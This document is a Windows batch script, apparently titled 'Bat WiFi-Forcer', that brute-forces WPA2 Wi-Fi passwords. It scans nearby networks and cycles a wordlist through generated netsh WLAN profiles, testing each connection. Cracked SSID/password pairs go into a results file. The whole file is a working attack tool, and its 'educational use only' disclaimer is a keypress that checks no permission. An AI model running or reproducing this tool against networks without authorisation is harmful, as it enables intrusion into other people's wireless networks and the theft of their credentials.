@echo off
:: Bat WiFi-Forcer - Voltsparx
:: Enhanced version with additional features and optimizations
:: https://github.com/voltsparx

:: Legal Disclaimer - More prominent
echo ===============================================================================
echo                 BATCH WIFI BRUTE FORCER - EDUCATIONAL USE ONLY
echo ===============================================================================
echo This tool is provided for educational purposes only. Unauthorized access to
echo computer networks is illegal in most jurisdictions. Use only on networks you
echo own or have explicit permission to test.
echo.
echo By using this tool, you acknowledge that:
echo 1. You have permission to test the target network(s)
echo 2. You understand the legal implications of unauthorized access
echo 3. You accept full responsibility for your actions
echo ===============================================================================
echo.
choice /c IA /m "I Accept these terms / Abort (I/A)"
if errorlevel 2 (
    echo Operation aborted.
    exit /b 0
)

cls
setlocal enabledelayedexpansion
title Batch Wi-Fi Brute Forcer - Educational Use
color 0f

cd /D %~dp0

:: Initialize enhanced variables
set "LOG_FILE=wifi_attack.log"
set "RESULTS_FILE=wifi_results.txt"
set "TEMP_PROFILE=temp_wifi_profile.xml"
set "BACKUP_PROFILE=backup_profile.xml"
set "SESSION_FILE=session_state.txt"

:: Enhanced cleanup routine
call :enhanced_cleanup

:: Check admin privileges with better feedback
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Administrator privileges required!
    echo Please right-click and "Run as administrator"
    echo.
    pause
    exit /b 1
)

:: Enhanced command availability check
call :check_requirements
if !REQUIREMENTS_MET! neq true (
    pause
    exit /b 1
)

:: Initialize variables (preserving your original names)
set interface_number=0
set interface_mac=not_defined
set interface_id=not_defined
set interface_state=not_defined
set interface_description=not_defined
set wifi_target=not_defined
set attack_counter_option=10
set wordlist_file=wordlist.txt

:: Enhanced wordlist initialization
if not exist "%wordlist_file%" (
    call :create_default_wordlist
)

:: Load previous session if exists
if exist "%SESSION_FILE%" (
    call :load_session_state
)

:program_entry
    call :interface_init
    call :mainmenu
goto :eof

:: Enhanced cleanup function
:enhanced_cleanup
    if exist "%TEMP_PROFILE%" del "%TEMP_PROFILE%" >nul 2>&1
    if exist "importwifi.xml" del "importwifi.xml" >nul 2>&1
    if exist "Wi-Fi-*.xml" del "Wi-Fi-*.xml" >nul 2>&1
    if exist "%BACKUP_PROFILE%" del "%BACKUP_PROFILE%" >nul 2>&1
goto :eof

:: Enhanced requirement checking
:check_requirements
    set "REQUIREMENTS_MET=true"
    
    where netsh >nul 2>&1
    if errorlevel 1 (
        echo ERROR: netsh command not available!
        echo This is required for WiFi operations.
        set "REQUIREMENTS_MET=false"
    )

    where wmic >nul 2>&1
    if errorlevel 1 (
        echo ERROR: wmic command not available!
        echo This is required for interface status checking.
        set "REQUIREMENTS_MET=false"
    )
    
    :: Check if WiFi is enabled
    netsh wlan show interfaces >nul 2>&1
    if errorlevel 1 (
        echo WARNING: No WiFi interfaces detected or WiFi is disabled.
        echo.
    )
goto :eof

:: Enhanced default wordlist creation
:create_default_wordlist
    echo Creating default wordlist with common passwords...
    echo.
    (
        echo password
        echo 12345678
        echo qwertyui
        echo admin123
        echo welcome1
        echo letmein
        echo password123
        echo 1234567890
        echo internet
        echo wireless
        echo default
        echo 1234abcd
        echo changeme
        echo 123abc
        echo letmein123
        echo adminadmin
        echo passw0rd
        echo qwerty123
        echo hello123
        echo monkey123
    ) > "%wordlist_file%"
    echo Default wordlist created with 20 common passwords.
    timeout /t 2 >nul
goto :eof

:: Session management functions
:save_session_state
    (
        echo interface_id=!interface_id!
        echo interface_description=!interface_description!
        echo interface_mac=!interface_mac!
        echo wifi_target=!wifi_target!
        echo wordlist_file=!wordlist_file!
        echo attack_counter_option=!attack_counter_option!
    ) > "%SESSION_FILE%"
goto :eof

:load_session_state
    for /f "tokens=1,2 delims==" %%a in ('type "%SESSION_FILE%"') do (
        set "%%a=%%b"
    )
    echo Loaded previous session state.
    timeout /t 1 >nul
goto :eof

:: Your awesome banner display function
:show_banner
    cls
    echo.
    echo.     
    echo     ____        _    __        ___ _____ _       _____                       
    echo    | __ )  __ _| |_  \ \      / (_)  ___(_)     |  ___|__  _ __ ___ ___ _ __ 
    echo    |  _ \ / _` | __|  \ \ /\ / /| | |_  | |_____| |_ / _ \| '__/ __/ _ \ '__|
    echo    | |_) | (_| | |_    \ V  V / | |  _| | |_____|  _| (_) | | | (_|  __/ |   
    echo    |____/ \__,_|\__|    \_/\_/  |_|_|   |_|     |_|  \___/|_|  \___\___|_|   
    echo.
    echo.
    call :color_echo . cyan "Bat WiFi-Forcer - By Voltsparx"
    echo.
    echo.
goto :eof

:: Enhanced attack function with progress tracking
:attack
    set attack_finalize=false

    if "!wordlist_file!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please provide a wordlist first!"
        echo.
        echo.
        pause
        goto :eof
    )

    if not exist "!wordlist_file!" (
        cls
        echo.
        call :color_echo . red "Wordlist file not found: !wordlist_file!"
        echo.
        echo.
        pause
        goto :eof
    )

    :: Backup existing profile if it exists
    netsh wlan export profile name="!wifi_target!" folder="%~dp0" key=clear >nul 2>&1
    if exist "Wi-Fi-!wifi_target!.xml" (
        ren "Wi-Fi-!wifi_target!.xml" "%BACKUP_PROFILE%"
        echo Backed up existing profile for !wifi_target!
    )

    :: Log attack start with timestamp
    echo [%date% %time%] Starting attack on: !wifi_target! >> "%LOG_FILE%"
    echo [%date% %time%] Using wordlist: !wordlist_file! >> "%LOG_FILE%"
    echo [%date% %time%] Using interface: !interface_id! >> "%LOG_FILE%"
    
    :: Count passwords in wordlist for progress tracking
    set /a total_passwords=0
    for /f "usebackq delims=" %%i in ("!wordlist_file!") do set /a total_passwords+=1
    
    call :show_banner
    echo.
    call :color_echo . cyan "Attack Progress"
    echo.
    echo.
    call :color_echo . magenta "Target: "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Total passwords: "
    call :color_echo . white "!total_passwords!"
    echo.
    call :color_echo . magenta "Interface: "
    call :color_echo . white "!interface_id!"
    echo.
    echo.
    
    set /a current_password=0
    set /a success=0
    
    :: Main attack loop
    for /f "usebackq tokens=1" %%a in ("!wordlist_file!") do (
        set /a current_password+=1
        set "password=%%a"
        
        :: Display progress
        call :show_banner
        echo.
        call :color_echo . cyan "Attack Progress: !current_password!/!total_passwords!"
        echo.
        echo.
        call :color_echo . magenta "Trying: "
        call :color_echo . yellow "!password!"
        echo.
        call :color_echo . magenta "Elapsed: "
        call :color_echo . white "!current_password! of !total_passwords!"
        echo.
        echo.
        
        :: Log attempt
        echo [%date% %time%] Trying: !password! >> "%LOG_FILE%"
        
        :: Create and test profile
        call :create_wifi_profile "!wifi_target!" "!password!"
        call :test_wifi_connection "!wifi_target!"
        
        if "!connected!" equ "true" (
            set /a success=1
            echo [%date% %time%] SUCCESS: Found password for !wifi_target! - !password! >> "%LOG_FILE%"
            echo [%date% %time%] !wifi_target!:!password! >> "%RESULTS_FILE%"
            call :attack_success
            goto :attack_cleanup
        )
    )
    
    :attack_cleanup
    :: Restore backup profile if it existed
    if exist "%BACKUP_PROFILE%" (
        netsh wlan add profile filename="%BACKUP_PROFILE%" >nul 2>&1
        echo Restored original profile for !wifi_target!
        del "%BACKUP_PROFILE%" >nul 2>&1
    )
    
    if !success! equ 0 (
        echo [%date% %time%] FAILED: No password found for !wifi_target! >> "%LOG_FILE%"
        call :attack_failure
    )
    
    :: Cleanup temp files
    call :enhanced_cleanup
goto :eof

:: Enhanced WiFi profile creation with better error handling
:create_wifi_profile
    set "ssid=%~1"
    set "pass=%~2"
    
    :: Escape XML special characters more thoroughly
    set "ssid_esc=!ssid:&=^&amp;!"
    set "ssid_esc=!ssid_esc:<=^&lt;!"
    set "ssid_esc=!ssid_esc:>=^&gt;!"
    set "ssid_esc=!ssid_esc:"=^&quot;!"
    set "ssid_esc=!ssid_esc:'=^&apos;!"
    
    set "pass_esc=!pass:&=^&amp;!"
    set "pass_esc=!pass_esc:<=^&lt;!"
    set "pass_esc=!pass_esc:>=^&gt;!"
    set "pass_esc=!pass_esc:"=^&quot;!"
    set "pass_esc=!pass_esc:'=^&apos;!"
    
    :: Create the XML profile with better formatting
    (
        echo ^<?xml version="1.0"?^>
        echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>
        echo    ^<name^>!ssid_esc!^</name^>
        echo    ^<SSIDConfig^>
        echo        ^<SSID^>
        echo            ^<name^>!ssid_esc!^</name^>
        echo        ^</SSID^>
        echo    ^</SSIDConfig^>
        echo    ^<connectionType^>ESS^</connectionType^>
        echo    ^<connectionMode^>manual^</connectionMode^>
        echo    ^<MSM^>
        echo        ^<security^>
        echo            ^<authEncryption^>
        echo                ^<authentication^>WPA2PSK^</authentication^>
        echo                ^<encryption^>AES^</encryption^>
        echo                ^<useOneX^>false^</useOneX^>
        echo            ^</authEncryption^>
        echo            ^<sharedKey^>
            echo                ^<keyType^>passPhrase^</keyType^>
            echo                ^<protected^>false^</protected^>
            echo                ^<keyMaterial^>!pass_esc!^</keyMaterial^>
            echo            ^</sharedKey^>
        echo        ^</security^>
        echo    ^</MSM^>
        echo    ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^>
        echo        ^<enableRandomization^>false^</enableRandomization^>
        echo    ^</MacRandomization^>
        echo ^</WLANProfile^>
    ) > "%TEMP_PROFILE%"
    
    :: Add the profile with error checking
    netsh wlan delete profile name="!ssid!" interface="!interface_id!" >nul 2>&1
    netsh wlan add profile filename="%TEMP_PROFILE%" interface="!interface_id!" >nul 2>&1
    if errorlevel 1 (
        echo ERROR: Failed to add WiFi profile
        echo Check if the SSID contains special characters that need escaping
    )
goto :eof

:: Enhanced connection testing
:test_wifi_connection
    set "ssid=%~1"
    set "connected=false"
    
    :: Connect to the network
    netsh wlan connect name="!ssid!" interface="!interface_id!" >nul 2>&1
    
    :: Wait for connection with better timeout handling
    for /l %%i in (1,1,!attack_counter_option!) do (
        call :color_echo . white "Attempt !%%i!/!attack_counter_option! "
        timeout /t 1 /nobreak >nul
        call :check_connection_state "!ssid!"
        if "!connection_state!" equ "connected" (
            set "connected=true"
            call :color_echo . green "Connected!"
            echo.
            goto :break_connection_test
        ) else (
            call :color_echo . red "Failed"
            echo.
        )
    )
    
    :break_connection_test
    :: Always disconnect after test
    netsh wlan disconnect interface="!interface_id!" >nul 2>&1
    timeout /t 1 /nobreak >nul
goto :eof

:: Enhanced connection state checking
:check_connection_state
    set "target_ssid=%~1"
    set "connection_state=disconnected"
    
    for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr /C:"SSID"') do (
        set "current_ssid=%%a"
        call :trim_spaces current_ssid
        if "!current_ssid!" equ "!target_ssid!" (
            set "connection_state=connected"
        )
    )
goto :eof

:: Enhanced success handler
:attack_success
    del /Q /F importwifi.xml 2>nul
    call :show_banner
    echo.
    call :color_echo . green "SUCCESS: Password found!"
    echo.
    echo.
    call :color_echo . magenta "Target: "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Password: "
    call :color_echo . white "!password!"
    echo.
    call :color_echo . magenta "Attempt: "
    call :color_echo . white "!current_password! of !total_passwords!"
    echo.
    echo.
    
    :: Save to results with timestamp
    echo [%date% %time%] !wifi_target! : !password! >> "%RESULTS_FILE%"
    
    :: Offer to connect permanently
    echo.
    call :color_echo . yellow "Would you like to save this network connection? (Y/N)"
    echo.
    choice /c YN /n
    if errorlevel 2 (
        echo Network profile will not be saved.
    ) else (
        netsh wlan add profile filename="%TEMP_PROFILE%" >nul 2>&1
        echo Network profile saved permanently.
    )
    
    pause
goto :eof

:: Enhanced failure handler
:attack_failure
    del /Q /F importwifi.xml 2>nul
    call :show_banner
    echo.
    call :color_echo . red "No password found in the wordlist."
    echo.
    echo.
    call :color_echo . magenta "Target: "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Passwords tried: "
    call :color_echo . white "!total_passwords!"
    echo.
    echo.
    call :color_echo . yellow "Consider:"
    echo 1. Using a larger wordlist
    echo 2. Checking if the network uses WPA3 (not supported)
    echo 3. Verifying the network is in range
    echo.
    pause
goto :eof

:: Enhanced exit routine
:exit
    call :save_session_state
    call :enhanced_cleanup
    echo.
    echo Session saved. Goodbye!
    timeout /t 2 >nul
    exit /b 0

:: =============================================================================
:: YOUR ORIGINAL FUNCTIONS (Preserved exactly as you wrote them)
:: =============================================================================

:color_echo 
    :: Check if the first 2 arguments are empty, cause they are needed for background/foreground information
    :: The 3rd argument is not that important because it can be an empty string
    if "%~1" equ "" (
        goto :eof
    )
    if "%~2" equ "" (
        goto :eof
    )

    :: Background color; if invalid, no action
    if "%~1" equ "black" (
        <nul set /p=[40m
    )

    if "%~1" equ "red" (
        <nul set /p=[41m
    )

    if "%~1" equ "green" (
        <nul set /p=[42m
    )

    if "%~1" equ "yellow" (
        <nul set /p=[43m
    )

    if "%~1" equ "blue" (
        <nul set /p=[44m
    )

    if "%~1" equ "magenta" (
        <nul set /p=[45m
    )

    if "%~1" equ "cyan" (
        <nul set /p=[46m
    )

    if "%~1" equ "white" (
        <nul set /p=[47m
    )

    :: Foreground color; if invalid, no action

    if "%~2" equ "black" (
        <nul set /p=[30m
    )

    if "%~2" equ "red" (
        <nul set /p=[31m
    )

    if "%~2" equ "green" (
        <nul set /p=[32m
    )

    if "%~2" equ "yellow" (
        <nul set /p=[33m
    )

    if "%~2" equ "blue" (
        <nul set /p=[34m
    )

    if "%~2" equ "magenta" (
        <nul set /p=[35m
    )

    if "%~2" equ "cyan" (
        <nul set /p=[36m
    )

    if "%~2" equ "white" (
        <nul set /p=[37m
    )

    <nul set /p="%~3"

    <nul set /p=[0m
goto :eof

:interface_detection
    cls
    echo.
    call :color_echo . yellow "Detecting interfaces..."
    echo.
    set interface_temp_index=0
    set interface_number=0

    set interface_parse_counter=0
    set interface_parse_begin=false
    set interface_parse_line=
    set interface_parse_arg=

    for /f "skip=2 tokens=* delims=" %%a in ('netsh wlan show interfaces ^| findstr /n "^"') do (
        set "interface_parse_line=%%a"
        set "interface_parse_line=!interface_parse_line:*:=!"
        
        if "!interface_parse_begin!" equ "true" if "!interface_parse_line!" neq "" (

            for /f "tokens=1,* delims=:" %%x in ('echo !interface_parse_line!') do set interface_parse_arg=%%y
            call :trim_spaces interface_parse_arg
            
            if "!interface_parse_counter!" equ "0" (
                set interface[!interface_temp_index!]_id=!interface_parse_arg!
            )

            if "!interface_parse_counter!" equ "1" (
                set interface[!interface_temp_index!]_description=!interface_parse_arg!
            )

            if "!interface_parse_counter!" equ "3" (
                set interface[!interface_temp_index!]_mac=!interface_parse_arg!
            )

            set /a interface_parse_counter=!interface_parse_counter!+1
        )

        if !interface_parse_counter! gtr 4 (
            set interface_parse_counter=0
            set /a interface_temp_index=!interface_temp_index!+1
            set interface_parse_begin=false
        )

        if "!interface_parse_line!" equ "" (
            set interface_parse_begin=true
        )

    )

    rem Last line must be redacted
    set /a interface_temp_index=!interface_temp_index!-1

    set /a interface_number=!interface_temp_index!+1
    timeout /t 2 >nul
    cls
goto :eof

:interface_init
    cls
    :: Interface detection and selection
    call :interface_detection
    echo.
    call :color_echo . cyan " Interface Init"
    echo.
    echo.
	if "!interface_number!" equ "1" (

        call :color_echo . yellow " Only '1' Interface Found!"
        echo.
        echo.
        call :color_echo . white " !interface[0]_description!("
        call :color_echo . blue "!interface[0]_mac!"
        call :color_echo . white ")"
        echo.
        echo.
        echo Making !interface[0]_description! the default interface...
        set interface_id=!interface[0]_id!
        set interface_description=!interface[0]_description!
        set interface_mac=!interface[0]_mac!
        timeout /t 3 >nul
	)
	
	if !interface_number! gtr 1 (

        call :color_echo . yellow " Multiple '!interface_number!' Interfaces Found!"
        echo.
        timeout /t 3 >nul
        call :interface_selection
        
	)
	
	if "!interface_number!"=="0" (

        call :color_echo . yellow "WARNING"
        echo.
        echo No interfaces found on this device^^!
        echo.
        set interface_id=not_defined
        set interface_description=not_defined
        set interface_mac=not_defined
        pause
        cls
	)

goto :eof

:interface_selection
    cls
    echo.
    call :color_echo . cyan "Interface Selection"
    echo.
    echo.
    set wifi_target=not_defined
    set /a interface_number_zero_indexed=!interface_number!-1
    set /a cancel_index=!interface_number_zero_indexed!+1

    for /l %%a in ( 0, 1, !interface_number_zero_indexed! ) do (
        call :color_echo . magenta "%%a) "
        call :color_echo . white " !interface[%%a]_description!("
        call :color_echo . blue "!interface[%%a]_mac!"
        call :color_echo . white ")"
        echo.
    )
    call :color_echo
    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt

    if "!program_prompt_input!" equ "" (
        call :program_prompt_invalid_input
        goto :interface_selection
    )

    if !program_prompt_input! leq !interface_number_zero_indexed! (
        if !program_prompt_input! geq 0 (
            echo.
            echo Making !interface[%program_prompt_input%]_description! the interface...
            set interface_id=!interface[%program_prompt_input%]_id!
            set interface_description=!interface[%program_prompt_input%]_description!
            set interface_mac=!interface[%program_prompt_input%]_mac!
            timeout /t 3 >nul
        ) else (
            if "!program_prompt_input!" equ "!cancel_index!" (
                set interface_id=not_defined
                set interface_description=not_defined
                set interface_mac=not_defined
                goto :eof
            ) else (
                call :program_prompt_invalid_input
                goto :interface_selection
            )
        )
    ) else (

        if "!program_prompt_input!" equ "!cancel_index!" (
            set interface_id=not_defined
            set interface_description=not_defined
            set interface_mac=not_defined
            goto :eof
        ) else (
            call :program_prompt_invalid_input
            goto :interface_selection
        )
    )
goto :eof

:program_prompt
    call :color_echo . green " bruteforcer"
    call :color_echo . white "$ "
    set /p program_prompt_input=
goto :eof

:program_prompt_invalid_input
    call :color_echo . red "Invalid input"
    timeout /t 3 >nul
goto :eof

:mainmenu
    call :show_banner
    call :color_echo . magenta "Interface : "
    call :color_echo . white "!interface_description!("
    call :color_echo . blue "!interface_mac!"
    call :color_echo . white ") "
    echo.
    call :color_echo . magenta "ID        : "
    call :color_echo . white "!interface_id!"
    echo.
    call :color_echo . magenta "Target    : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Wordlist  : "
    call :color_echo . white "!wordlist_file!"
    echo.
    echo.
    echo Type 'help' for more info
    echo.
    call :program_prompt
    echo.

    if "%program_prompt_input%" equ "scan" (
        call :scan
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "interface" (
        call :interface_init
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "attack" (
        call :attack
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "help" (
        call :help
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "wordlist" (
        call :wordlist
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "counter" (
        call :counter
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "exit" (
        goto :exit
    )

    call :program_prompt_invalid_input
goto :mainmenu

:scan
    cls

    if "%interface_id%" equ "not_defined" (
        call :color_echo . red "You have to select an interface to perform a scan"
        set wifi_target=not_defined
        echo.
        echo.
        pause
        goto :eof
    )

    netsh wlan disconnect interface="%interface_id%" > nul

    :scan_wait_disconnected_loop
    call :interface_find_state

    if "%interface_state%" neq "disconnected" (
        goto :scan_wait_disconnected_loop
    )
    

    echo.
    call :color_echo . cyan "Possible Wi-Fi Networks"
    echo.
    echo.
    echo Scanning...
    echo.
    :: wifi[] is the array for possible wifis
    set scan_wifi_index=0
    set cancel_index=0

    set scan_parse_counter=0
    set scan_parse_begin=false
    set scan_parse_line=
    set scan_parse_arg=

    for /f "skip=3 tokens=* delims=" %%a in ('netsh wlan show networks mode^=bssid interface^="%interface_id%" ^| findstr /n "^"') do (
        set "scan_parse_line=%%a"
        set "scan_parse_line=!scan_parse_line:*:=!"

        if "!scan_parse_begin!" equ "true" if "!scan_parse_line!" neq "" (
            for /f "tokens=1,* delims=:" %%x in ("!scan_parse_line!") do set scan_parse_arg=%%y

            call :trim_spaces scan_parse_arg

            if "!scan_parse_counter!" equ "0" (
                set wifi[!scan_wifi_index!]_ssid=!scan_parse_arg!
            )

            if "!scan_parse_counter!" equ "5" (
                set wifi[!scan_wifi_index!]_signal=!scan_parse_arg!
            )

            set /a scan_parse_counter=!scan_parse_counter!+1

        )

        if !scan_parse_counter! gtr 5 (
            set scan_parse_counter=0
            set /a scan_wifi_index=!scan_wifi_index!+1
            set scan_parse_begin=false
        )

        if "!scan_parse_line!" equ "" (
            set scan_parse_begin=true
        )

    )
    set /a scan_wifi_index=!scan_wifi_index!-1
    set /a cancel_index=!scan_wifi_index!+1
    
    for /l %%a in ( 0, 1, !scan_wifi_index! ) do (

        call :color_echo . magenta "%%a) "

        if "!wifi[%%a]_ssid!" equ "" (
            call :color_echo . red "No Name "
        ) else (
            call :color_echo . white "!wifi[%%a]_ssid! "
        )

        call :color_echo . blue "!wifi[%%a]_signal!"
        echo.
    )


    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt
    echo.
    if "!program_prompt_input!" equ "!cancel_index!" (
        goto :eof
    )
    if !program_prompt_input! leq !scan_wifi_index! if !program_prompt_input! geq 0 (
            set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
            goto :eof
    )
    call :program_prompt_invalid_input

goto :eof

:help
	cls
	echo.
	call :color_echo . cyan "Commands"
	echo.
	echo.
	echo  - help             : Displays this page
	echo  - wordlist         : Provide a wordlist file
	echo  - scan             : Performs a WI-FI scan
	echo  - interface        : Open Interface Management
	echo  - attack           : Attacks selected WI-FI
	echo  - counter          : Sets the attack counter
	echo  - exit             : Close the program
	echo.
	echo  For more information, please refer to "README.md".
	echo.
	echo  More projects from TechnicalUserX:
	echo  https://github.com/voltsparx
    echo.
    echo  Contact: voltsparx@gmail.com
	echo.
	echo.
	echo Press any key to continue...
	pause >nul

goto :eof

:wordlist
    cls
    echo.
    call :color_echo . cyan "Wordlist"
    echo.
    echo.
    echo Please provide a valid wordlist
    echo.
    call :program_prompt
    echo.
    if not exist "!program_prompt_input!" (
        call :color_echo . red "Provided path does not resolve to a file"
        timeout /t 2 >nul
    ) else (
        set wordlist_file=!program_prompt_input!
        goto :eof
    )
goto :eof

:counter
    cls
    echo.
    call :color_echo . cyan "Set Attempt Count"
    echo.
    echo.
    echo Please provide number for per-password 
    echo counter while attacking a network.
    echo.
    echo This counter will be used to query network
    echo connection whether it is successful.
    echo.
    call :program_prompt
    echo.
    echo %program_prompt_input%| findstr /r "^[0-9]*$" >nul
    
    if "%errorlevel%" equ "0" (
        set attack_counter_option=!program_prompt_input!
    ) else (
        call :color_echo . red "Provided input is not a valid number"
        timeout /t 2 >nul
    )
goto :eof

:interface_find_state

    for /f "tokens=2 delims==" %%A in ('wmic path WIN32_NetworkAdapter where "NetConnectionID='!interface_id!'" get NetConnectionStatus /value') do (
        set interface_status_code=%%A
    )

    if "%interface_status_code%"=="1" (
        set interface_state=connecting
    )

    if "%interface_status_code%"=="2" (
        set interface_state=connected
    )
    
    if "%interface_status_code%"=="3" (
        set interface_state=disconnecting
    )

    if "%interface_status_code%"=="7" (
        set interface_state=disconnected
    )

    if "%interface_status_code%"=="8" (
        set interface_state=authenticating
    )

goto :eof

:exit_fatal
    call :color_echo . red "%~1"
    timeout /t 3 >nul
    exit
goto :eof

:trim_right
        set "str=!%~1!"
        :trim_right_loop
        if "!str:~-1!"==" " (
        set "str=!str:~0,-1!"
        goto trim_right_loop
        )
        set %~1=!str!
goto :eof

:trim_left
    set "str=!%~1!"
    :trim_left_loop
    if "!str:~0,1!"==" " (
        set "str=!str:~1!"
        goto trim_left_loop
    )
    set %~1=!str!
goto :eof

:trim_spaces
        call :trim_left %1
        call :trim_right %1
goto :eof